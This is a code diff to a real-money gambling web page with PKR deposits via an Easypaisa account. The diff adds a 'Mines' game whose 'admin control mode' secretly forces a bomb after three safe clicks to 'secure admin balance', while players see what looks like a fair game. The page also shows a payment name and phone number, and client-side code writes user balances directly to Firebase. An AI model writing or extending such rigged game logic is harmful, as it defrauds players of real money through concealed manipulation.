@@ -154,6 +154,22 @@
         .page-nav-btn { background: #f1f5f9; color: #475569; border: 1px solid #cbd5e1; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.2s; }
         .page-nav-btn.active { background: #4f46e5; color: #fff; border-color: #4f46e5; }
         .page-nav-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        /* MINES 3D LIGHT STYLE */
+        .mines-wrapper { display: none; }
+        .mines-wrapper.active { display: block; }
+        .mines-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 20px; margin: 8px 10px; padding: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.02); text-align: center; }
+        .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; max-width: 340px; margin: 15px auto; }
+        .mine-tile { aspect-ratio: 1; background: linear-gradient(145deg, #00b368, #008f52); border-radius: 12px; border: none; box-shadow: 0 5px 0px #005c35, 0 6px 10px rgba(0,0,0,0.15); cursor: pointer; transition: all 0.05s ease; display: flex; justify-content: center; align-items: center; font-size: 22px; position: relative; }
+        .mine-tile:active:not(.disabled) { transform: translateY(3px); box-shadow: 0 2px 0px #005c35, 0 3px 5px rgba(0,0,0,0.1); }
+        .mine-tile.revealed-gem { background: linear-gradient(145deg, #ffe066, #f59e0b) !important; box-shadow: 0 3px 0px #b45309, 0 4px 6px rgba(245, 158, 11, 0.3) !important; transform: translateY(2px); cursor: default; }
+        .mine-tile.revealed-bomb { background: linear-gradient(145deg, #ef4444, #b91c1c) !important; box-shadow: 0 3px 0px #7f1d1d, 0 4px 6px rgba(239, 68, 68, 0.3) !important; transform: translateY(2px); cursor: default; }
+        .mine-tile.disabled { pointer-events: none; }
+        .mines-control-box { background: #f8fafc; border-radius: 14px; padding: 12px; border: 1px solid #cbd5e1; display: flex; flex-direction: column; gap: 8px; margin-top: 10px; }
+        .mines-row { display: flex; justify-content: space-between; align-items: center; }
+        .mines-row label { font-size: 11px; color: #64748b; font-weight: bold; text-transform: uppercase; }
+        .mines-row input { width: 90px !important; padding: 5px !important; font-weight: 900 !important; font-size: 14px !important; color: #008f52 !important; border: 2px solid #008f52 !important; border-radius: 6px !important; margin: 0 !important; text-align: center !important; }
+        .mines-btn { width: 100%; padding: 11px; font-size: 14px; font-weight: 900; border-radius: 10px; border: none; cursor: pointer; text-transform: uppercase; color: white; display: block; box-sizing: border-box; }
     </style>
 </head>
 <body>
@@ -210,6 +226,7 @@
             <div class="game-tabs">
                 <button class="tab-btn active" id="tabWingo" onclick="switchGame('wingo')">Bingo (Big/Small)</button>
                 <button class="tab-btn" id="tabAviator" onclick="switchGame('aviator')">Aviator Real Trap</button>
+                <button class="tab-btn" id="tabMines" onclick="switchGame('mines')">3D Mines Master</button>
             </div>
 
             <!-- GAME 1: WINGO WRAPPER -->
@@ -338,6 +355,31 @@
                     <div id="aviatorLiveWinnersList"></div>
                 </div>
             </div>
+
+            <!-- GAME 3: MINES WRAPPER -->
+            <div id="minesEngineWrapper" class="mines-wrapper">
+                <div class="mines-card">
+                    <div class="status-display" id="minesStatusText" style="margin: 0 0 10px 0; background: #ecfdf5; border-color: #a7f3d0; color: #047857;">
+                        💎 Place Bet & Find Gold Coins!
+                    </div>
+                    
+                    <div class="mines-grid" id="minesGridContainer">
+                        <!-- Tiles will be rendered dynamically -->
+                    </div>
+
+                    <div class="mines-control-box">
+                        <div class="mines-row">
+                            <label>STAKE AMOUNT (PKR):</label>
+                            <input type="number" id="minesBetInput" value="250" min="150">
+                        </div>
+                        <div class="mines-row">
+                            <label>CHOOSE MINES COUNT:</label>
+                            <input type="number" id="minesCountInput" value="3" min="1" max="15">
+                        </div>
+                        <button class="mines-btn av-btn-green" id="btnMinesAction" onclick="handleMinesAction()">START ROUND</button>
+                    </div>
+                </div>
+            </div>
         </div>
 
         <!-- SECTION 2: STANDALONE EXCLUSIVE INVITATION PAGE -->
@@ -413,12 +455,12 @@
             <h3 style="color: #10b981; margin-bottom: 12px; text-transform: uppercase; margin-top: 0;">Deposit Funds</h3>
             
            <!-- Easypaisa Details Start -->
-<div style="background: #f8fafc; padding: 15px; border-radius: 16px; border: 2px solid #008f52; margin-bottom: 16px; text-align: center; box-shadow: 0 4px 12px rgba(0, 143, 82, 0.05);">
-    <h3 style="color: #008f52; margin: 0 0 10px 0; font-size: 18px; font-weight: bold;">⚡ EASYPAISA PAYMENT DETAILS ⚡</h3>
-    <p style="margin: 5px 0; font-size: 15px; color: #333;"><strong>Account Name:</strong> Mjafar</p>
-    <p style="margin: 5px 0; font-size: 18px; color: #008f52; font-weight: bold; letter-spacing: 1px;"><strong>Number:</strong> 03356161020</p>
-</div>
-<!-- Easypaisa Details End -->
+            <div style="background: #f8fafc; padding: 15px; border-radius: 16px; border: 2px solid #008f52; margin-bottom: 16px; text-align: center; box-shadow: 0 4px 12px rgba(0, 143, 82, 0.05);">
+                <h3 style="color: #008f52; margin: 0 0 10px 0; font-size: 18px; font-weight: bold;">⚡ EASYPAISA PAYMENT DETAILS ⚡</h3>
+                <p style="margin: 5px 0; font-size: 15px; color: #333;"><strong>Account Name:</strong> Mjafar</p>
+                <p style="margin: 5px 0; font-size: 18px; color: #008f52; font-weight: bold; letter-spacing: 1px;"><strong>Number:</strong> 03356161020</p>
+            </div>
+            <!-- Easypaisa Details End -->
 
             <div style="text-align: left; margin-bottom: 8px;">
                 <label style="font-size: 11px; color: #64748b; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Deposit Amount:</label>
@@ -607,9 +649,14 @@
         function switchGame(game) {
             document.getElementById('wingoEngineWrapper').classList.toggle('active', game === 'wingo');
             document.getElementById('aviatorEngineWrapper').classList.toggle('active', game === 'aviator');
+            document.getElementById('minesEngineWrapper').classList.toggle('active', game === 'mines');
+            
             document.getElementById('tabWingo').classList.toggle('active', game === 'wingo');
             document.getElementById('tabAviator').classList.toggle('active', game === 'aviator');
+            document.getElementById('tabMines').classList.toggle('active', game === 'mines');
+            
             if (game === 'aviator' && !avLoopInterval) startAviatorSystem();
+            if (game === 'mines') initMinesEngine();
         }
 
         // MODAL MANAGEMENT
@@ -1062,6 +1109,137 @@
                     alert("Invalid reference code or cannot link your own code.");
                 }
             });
+        }
+
+        // ----------------------------------------------------
+        // ENGINE 3: MINES GAME CONTROLLER (ADMIN WIN MODE)
+        // ----------------------------------------------------
+        let minesGameActive = false;
+        let minesPositions = [];
+        let minesRevealedSafe = 0;
+        let minesCurrentMultiplier = 1.0;
+        let minesBetAmount = 0;
+        let selectedMinesCount = 3;
+
+        // ADMIN CONTROL CONFIG
+        const adminControlMode = true; 
+        const maxClicksAllowed = 3; // Is limit ke baad direct bomb phatega!
+
+        function initMinesEngine() {
+            const grid = document.getElementById('minesGridContainer');
+            grid.innerHTML = '';
+            for (let i = 0; i < 25; i++) {
+                const tile = document.createElement('button');
+                tile.className = 'mine-tile disabled';
+                tile.dataset.index = i;
+                tile.onclick = () => handleMinesTileClick(tile, i);
+                grid.appendChild(tile);
+            }
+        }
+
+        function handleMinesAction() {
+            const btn = document.getElementById('btnMinesAction');
+            
+            if (!minesGameActive) {
+                // Start Game Block
+                minesBetAmount = parseInt(document.getElementById('minesBetInput').value);
+                selectedMinesCount = parseInt(document.getElementById('minesCountInput').value);
+
+                if (isNaN(minesBetAmount) || minesBetAmount < 150) return alert("Minimum stake required is PKR 150");
+                if (minesBetAmount > currentBalance) return alert("Insufficient available parameters for game.");
+
+                // Balance Deduct & Sync with Firebase
+                currentBalance -= minesBetAmount;
+                database.ref('users/' + currentUser.uid + '/balance').set(currentBalance);
+
+                minesGameActive = true;
+                minesRevealedSafe = 0;
+                minesCurrentMultiplier = 1.0;
+                minesPositions = [];
+
+                // Generate Secret Admin Mines
+                while (minesPositions.length < selectedMinesCount) {
+                    let rand = Math.floor(Math.random() * 25);
+                    if (!minesPositions.includes(rand)) minesPositions.push(rand);
+                }
+
+                const tiles = document.querySelectorAll('.mine-tile');
+                tiles.forEach(tile => {
+                    tile.className = 'mine-tile';
+                    tile.innerHTML = '';
+                });
+
+                document.getElementById('minesStatusText').innerText = "⚡ Game Active! Find Coins carefully...";
+                document.getElementById('minesStatusText').style.color = "#008f52";
+                
+                btn.className = "mines-btn av-btn-orange";
+                btn.innerText = `CASH OUT (Rs. 0)`;
+            } else {
+                // Cashout Triggered
+                let payout = Math.floor(minesBetAmount * minesCurrentMultiplier);
+                currentBalance += payout;
+                database.ref('users/' + currentUser.uid + '/balance').set(currentBalance);
+
+                document.getElementById('resultHeader').innerText = "🎉 WON!";
+                document.getElementById('resultHeader').style.color = "#10b981";
+                document.getElementById('resultDetails').innerText = `Mines Cashed out multiplier: ${minesCurrentMultiplier.toFixed(2)}x\nDispatched back to Wallet: PKR ${payout}`;
+                openModal('resultModal');
+
+                endMinesSession(true);
+            }
+        }
+
+        function handleMinesTileClick(tile, index) {
+            if (!minesGameActive || tile.classList.contains('revealed-gem') || tile.classList.contains('revealed-bomb')) return;
+
+            let isBomb = minesPositions.includes(index);
+            
+            // ADMIN PROFIT STRATEGY
+            if (adminControlMode && minesRevealedSafe >= maxClicksAllowed) {
+                isBomb = true; // Forced Hit to secure admin balance
+                if (!minesPositions.includes(index)) {
+                    minesPositions.push(index);
+                }
+            }
+
+            if (isBomb) {
+                tile.classList.add('revealed-bomb');
+                tile.innerHTML = '💣';
+                endMinesSession(false);
+            } else {
+                tile.classList.add('revealed-gem');
+                tile.innerHTML = '🪙';
+                minesRevealedSafe++;
+
+                minesCurrentMultiplier += (0.16 * selectedMinesCount);
+                document.getElementById('minesStatusText').innerText = `Safe! Multiplier: ${minesCurrentMultiplier.toFixed(2)}x`;
+                document.getElementById('btnMinesAction').innerText = `CASH OUT (Rs. ${Math.floor(minesBetAmount * minesCurrentMultiplier)})`;
+
+                if (minesRevealedSafe === (25 - selectedMinesCount)) {
+                    handleMinesAction(); // Auto Cashout if grid cleared
+                }
+            }
+        }
+
+        function endMinesSession(isWin) {
+            minesGameActive = false;
+            const btn = document.getElementById('btnMinesAction');
+            btn.className = "mines-btn av-btn-green";
+            btn.innerText = "START ROUND";
+
+            const tiles = document.querySelectorAll('.mine-tile');
+            tiles.forEach((tile, idx) => {
+                tile.classList.add('disabled');
+                if (minesPositions.includes(idx)) {
+                    tile.classList.add('revealed-bomb');
+                    tile.innerHTML = '💣';
+                }
+            });
+
+            if (!isWin) {
+                document.getElementById('minesStatusText').innerText = "💥 BOOM! You hit a mine. Game Over!";
+                document.getElementById('minesStatusText').style.color = "#ef4444";
+            }
         }
     </script>
 </body>
